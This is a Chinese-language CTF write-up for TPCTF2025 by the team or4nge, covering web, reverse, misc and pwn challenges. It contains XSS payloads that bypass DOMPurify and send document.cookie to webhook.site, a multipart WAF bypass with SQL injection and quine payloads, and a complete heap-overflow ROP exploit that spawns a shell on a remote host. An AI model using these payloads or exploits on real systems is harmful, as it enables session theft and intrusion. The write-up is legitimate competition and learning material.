---
title: tpctf2025
titleTemplate: ':title | Writeups - or4nge'
layout: doc
---

# TPCTF2025 Writeup by or4nge

::: info
**Rank: 21**
:::

## Web

### baby layout

对提交的 `layout` 以及 `content` 使用 DOMPurify 进行 sanitize 后使用 `content` 替换 `layout` 中的 `content`，因为 sanitize 默认会 block 掉一些 tag，使用 img 的 attr 来 XSS：

```HTML
layout:
<img src='{{content}}'>

content:
" onerror="fetch('https://webhook.site/c09f0e76-a00d-465b-a5f9-79bc339020ba/?a='+document.cookie)
```

![img](https://or4nge-images.zeroc0077.cn/writeups/2025/tpctf2025/img_0.png)

### safe layout

在 sanitize 中将 `ALLOWED_ATTR` 清空了，无法在 tag 里面定义 attr 了，但实际上 DOMPurify 还有两个配置：`ALLOW_ARIA_ATTR` 以及 `ALLOW_DATA_ATTR` 这里没有注意，所以可以使用如下 payload 进行 XSS：

```HTML
layout:
<img aria-c='{{content}}'>

content:
" src="" onerror="fetch('https://webhook.site/8efa625c-8859-4655-81ea-76438baa22c0/?a='+document.cookie)
```

![img](https://or4nge-images.zeroc0077.cn/writeups/2025/tpctf2025/img_1.png)

### safe layout revenge

将上面提到的两个配置清空了，可以将 `{{content}}` 放在 `<` 与 tag 之间防止 DOMPurify 解析为一个元素，然后替换为空即可：

```HTML
layout:
x<style><{{content}}/style><{{content}}img src=x onerror=fetch('https://webhook.site/4e9fdccb-a86c-490c-981f-31f6af3035c3/?a='+document.cookie)></style>
```

![img](https://or4nge-images.zeroc0077.cn/writeups/2025/tpctf2025/img_2.png)

### supersqli

看到 go 写的 waf 中有对 `multipart/form-data` 的解析，猜测可能是通过 golang 和 django 对 request 的解析差异进行 waf 绕过，构造 payload 如下可以绕过：

```http
Content-Type: multipart/form-data; boundary="boundary";boundary*0="real-";boundary*1="boundary"
Content-Length: 246

--boundary
Content-Disposition: form-data; name="username"

admin
--boundary2
Content-Disposition: form-data; name="password"

admin
--boundary--

--real-boundary
Content-Disposition: form-data; name="username"

a
--real-boundary--
```

`password` 存在 sql 注入，首先测试盲注，将 admin 字段替换为如下内容：

```sql
' union select 1,1,(case when(substr((select password from blog_adminuser),1,1)='b') then randomblob(1000000000) else 0 end)--
```

发现 `blog_adminuser` 为空，同时无法堆叠注入，同时需要一种可以使 sql 注入时输入和输出相等的注入方式

测试 sql quine 注入，构造 payload 如下：

```sql
' union select 1,2,replace(replace('" union select 1,2,replace(replace("_",char(34),char(39)),char(95),"_")--',char(34),char(39)),char(95),'" union select 1,2,replace(replace("_",char(34),char(39)),char(95),"_")--')--
```

flag: `TPCTF{SQLi_1s_E4sy_13ut_H4rd}`

## Reverse

### chase

给了一个红白机的 NES 文件，运行后是一个小游戏。

通关可以获得第一部分 flag：

![img](https://or4nge-images.zeroc0077.cn/writeups/2025/tpctf2025/img_3.png)

在 tile 中可以看到第三部分 flag：

![img](https://or4nge-images.zeroc0077.cn/writeups/2025/tpctf2025/img_4.png)

第二部分 flag 通过 tile 的编号直接在文件中搜索 `_` 对应的字节进行定位即可。

flag: `TPCTF{D0_Y0U_L1KE_PLAY1N9_6@M3S_ON_Y0UR_N3S?}`

### linuxpdf

在 PDF 中提取 `embedded_files`，对其中每个文件进行 base64 解码后 zlib decompress 即可。

根据字符串 `Flag`，`Wrong` 等可以定位文件 `/root/files/000000000000004a`，整体是在做哈希对比，从后往前恢复即可：

```python
from hashlib import md5
import string

hashs = [
    "38F88A3BC570210F8A8D95585B46B065",
    "83055AE80CDC8BD59378B8628D733FCB",
    "FA7DAFFBD7ACEC13B0695D935A04BC0F",
    "C29CC0FD3801C7FDD315C782999BD4CB",
    "2BA2D01AF12D9BE31A2B44323C1A4F47",
    "DDEEBAF002527A9EAD78BD16684573CC",
    "BF95B89934A1B555E1090FECDFD3DA9F",
    "B6422C30B02938535F8E648D60A87B94",
    "08C1B76643AF8DD50CB06D7FDD3CF8ED",
    "42D69719F97088F06540F412DC1706FB",
    "A1F23DA61615400E7BD9EA72D63567EB",
    "4E246F0A5DD3CE59465FF3D02EC4F984",
    "B8CF25F963E8E9F4C3FDDA34F6F01A35",
    "2D98D820835C75A9F981AD4DB826BF8E",
    "702EAD08A3DD56B3134C7C3841A652AA",
    "D2D557B613662B92F399D612FB91591E",
    "E4422B6320ED989E7E3CB97F369CBA38",
    "71803586C67059DDA32525CE844C5079",
    "83B371801D0ADE07B5C4F51E8C6215E2",
    "B0D1B4885BC2FDC5A665266924486C5F",
    "792C9E7F05C407C56F3BEC4CA7E5C171",
    "3855E5A5BBC1CBE18A6EAB5DD97C063C",
    "886D45E0451BBBA7C0341FE90A954F34",
    "3A437CBE6591EA34896425856EAE7B65",
    "34304967A067308A76701F05C0668551",
    "D6AF7C4FEDCF2B6777DF8E83C932F883",
    "DF88931E7EEFDFCC2BB80D4A4F5710FB",
    "CB0FC813755A45CE5984BFBA15847C1E"
]

suffix = b"F}"
index = -len(suffix)
while len(suffix) < 29:
    for i in string.printable:
        if md5(bytes([ord(i)]) + suffix).digest() == bytes.fromhex(hashs[index]):
            suffix = bytes([ord(i)]) + suffix
            print(suffix.decode())
            index -= 1
            break
# TPCTF{mag1c_RISC-V_linux-PDF}
```

### portable

参考：https://github.com/jart/cosmopolitan

在 `sub_407F30` 发现关键逻辑，简单的异或后比较：

```python
key = b'Cosmopolitan'
data = bytes.fromhex("342A420E001D5C335E443E1A0B5C2C3A5F220328361B07318DDE10A2EBB2DAA2D8180D171C1FBDD91DBFEBA2D8160DA0F630BDD817BEDA0FABC1AEEA8DDE1101A1C5000000000000")
out = []

for i in range(0, 66):
    out.append(data[i] ^ key[i % len(key)])

print(bytes(out).decode('utf-8'))
# wE1com3_70_tH3_W0RlD_of_αcτµαlly_pδrταblε_εxεcµταblε
```

### magicfile

根据 https://github.com/file/file/tree/FILE5_41 可以恢复部分符号，整体是通过对输入的 flag 使用 magic set 进行 check，其中 magic 信息都存储在二进制文件中，通过定位 `Congratulation` 等字符串可以定位到关键逻辑。

```python
import idc
gap = 0x178
end = 0x426F84
flag = []
for i in range(41):
    flag.append(idc.get_db_byte(end))
    end -= gap
print(bytes(flag)[::-1])
# TPCTF{YoU_AR3_SO_5m@R7_TO_cRACk_Th1$_m@9iC_f1le}
```

### stone-game

没逆，交互后看明白大概逻辑就差不多了。

```python
from pwn import *
context.log_level = 'debug'


def game():
    stones = []
    for i in range(7):
        p.recvuntil(f'Segment {i + 1}: '.encode())
        stones.append(int(p.recvuntil(b'stones\n').strip().decode()[:-6]))
    p.recvuntil(b'Current player: ')
    player = p.recvline().strip().decode()
    return stones, player


p = remote("1.95.128.179", 3333)
p.sendafter(b'Press Enter to start...\n', b'\n')
while True:
    while True:
        stones, player = game()
        print(stones, player)
        p.recvuntil(
            b'Enter the number of stones to remove from each segment (space-separated, e.g.: 0 1 0 2 0 0 0):\n')
        if player == "You" and stones.count(0) == 6:
            ans = ' '.join(map(str, stones))
            p.sendline(ans.encode())
            game()
            break
        elif player == "You" and stones.count(0) == 5:
            ans = []
            flags = False
            for i in stones:
                if i <= 1 or flags:
                    ans.append(0)
                else:
                    ans.append(i - 1)
                    flags = True
            ans = ' '.join(map(str, ans))
            p.sendline(ans.encode())
        elif player == "You":
            ans = []
            flags = True
            for i in stones:
                if i != 0 and flags:
                    ans.append(i)
                    flags = False
                else:
                    ans.append(0)
            ans = ' '.join(map(str, ans))
            p.sendline(ans.encode())
        game()
# TPCTF{M0nt3_C4rl0_S34rch_1s_4w3s0m3_f0r_g4m3s}
```

### obfuscator

二进制文件是使用 deno compile js 混淆代码后得到的，直接在文件末尾可以找到 js 源码，解混淆后可知是在跑一个 wasm，其中 wasm 是通过 fetch 一个 base64 的 data 获取的，解码可以得到运行的 wasm 文件。

直接对 wasm 文件进行 strings 可以看到 `CBC` 以及编译命令等：

![img](https://or4nge-images.zeroc0077.cn/writeups/2025/tpctf2025/img_5.png)

`mask` 与 `maskedKey` 以及 `maskedIV` 异或后得到 Key 以及 IV 后对 `encryptedFlag` 进行解密即可：

![img](https://or4nge-images.zeroc0077.cn/writeups/2025/tpctf2025/img_6.png)

## Misc

### raenil

给出的附件是从两个二维码中间穿过，通过ps对可以进行图像拉伸的位置进行截图变换，可以知道是一个大小为29*29的二维码，但是通过变换只能恢复26列左右

![img](https://or4nge-images.zeroc0077.cn/writeups/2025/tpctf2025/img_7.png)

对离摄像头太近导致变形严重的部分进行手动恢复和猜测，通过手动拼凑可以得到最终二维码

![img](https://or4nge-images.zeroc0077.cn/writeups/2025/tpctf2025/img_8.png)

flag: `TPCTF{LIHHHHAWJ2123089hj091j2s++_+___+SO_FUN!!!}`

## Pwn

### EzDB

GetFreeSpaceSize 多了个+1，导致写 Record 可以向下溢出一字节，更改 size 造成越界读写

```python
from pwn import *
context.log_level='debug'
context.os='linux'
context.arch='amd64'

def add_page(idx):
    p.sendlineafter(b'>>> ',b'1')
    p.sendlineafter(b'Index: ',str(idx).encode())

def delete_page(idx):
    p.sendlineafter(b'>>> ',b'2')
    p.sendlineafter(b'Index: ',str(idx).encode())

def add_record(idx,lens,data):
    p.sendlineafter(b'>>> ',b'3')
    p.sendlineafter(b'Index: ',str(idx).encode())
    p.sendlineafter(b'Varchar Length: ',str(lens).encode())
    p.sendafter(b'Varchar: ',data)

def show_record(idx,ids):
    p.sendlineafter(b'>>> ',b'4')
    p.sendlineafter(b'Index: ',str(idx).encode())
    p.sendlineafter(b'Slot ID: ',str(ids).encode())

def edit_record(idx,ids,lens,data):
    p.sendlineafter(b'>>> ',b'5')
    p.sendlineafter(b'Index: ',str(idx).encode())
    p.sendlineafter(b'Slot ID: ',str(ids).encode())
    p.sendlineafter(b'Length: ',str(lens).encode())
    p.sendafter(b'Varchar: ',data)

p=remote('61.147.171.105',58012)
#p=process('./db')
for i in range(10):
    add_page(i)
for i in range(2,10):
    delete_page(i)
delete_page(1)
add_record(0,0x401-4,b'\x04')
show_record(0,0)
p.recvuntil(b'Varchar: ')
p.recv(0x44d)
heapbase=u64(p.recv(8))-0x12310
p.recv(0x28)
libcbase=u64(p.recv(8))-0x21ace0
log.info('libcbase: '+hex(libcbase))
log.info('heapbase: '+hex(heapbase))
libc=ELF('./libc.so.6')
add_page(1)
add_page(2)
add_record(2,0x401-4,b'\x04')
env=libcbase+libc.symbols['_environ']
pl=b'\x04'+b'\x00'*0x404+p64(0x31)+p64(env-0x400)*2+p64(env)+p64(env-0x400)
pl+=p64(0)+p64(0x411)
edit_record(2,0,0x40d+0x30,pl)
add_record(1,0x401-4,b'\x04')
show_record(1,0)
p.recvuntil(b'Varchar: ')
p.recv(0x3fd)
stack=u64(p.recv(8))-0x120
log.info('stack: '+hex(stack))
pl=b'\x00'*0x405+p64(0x31)+p64(stack-0x500)*2+p64(stack-0x100)+p64(stack-0x500)
pl+=p64(0)+p64(0x411)
edit_record(2,0,0x40d+0x30,pl)
add_record(1,0x401-4,b'\x05')
rdi=libcbase+0x2a3e5
ret=libcbase+0x29139
system=libcbase+libc.symbols['system']
bin_sh=libcbase+next(libc.search(b'/bin/sh\x00'))
rop=p64(ret)+p64(rdi)+p64(bin_sh)+p64(system)
#gdb.attach(p)
edit_record(1,0,0x49d+len(rop),b'\x00'*0xd+(0x490//8)*p64(ret)+rop)
p.interactive()
```
